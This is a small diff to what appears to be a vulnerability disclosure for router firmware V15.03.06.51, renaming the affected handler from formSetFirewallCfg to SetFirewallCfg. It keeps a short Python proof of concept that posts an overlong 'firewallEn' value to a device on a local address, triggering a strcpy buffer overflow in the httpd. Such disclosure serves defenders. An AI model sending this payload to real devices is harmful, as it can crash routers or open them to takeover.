@@ -6,7 +6,7 @@ version: V15.03.06.51
 
 ## Description:
 
-There is a buffer overflow in httpd/formSetFirewallCfg
+There is a buffer overflow in httpd/SetFirewallCfg
 
 ## Source:
 
@@ -25,7 +25,7 @@ get value from firewallEn, then call strcpy, cause buff overflow
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/formSetFirewallCfg"
+url = "http://192.168.1.13/goform/SetFirewallCfg"
 payload = 'A'*0x1000 + '\n'
 
 r = requests.post(url, data={'firewallEn': payload})
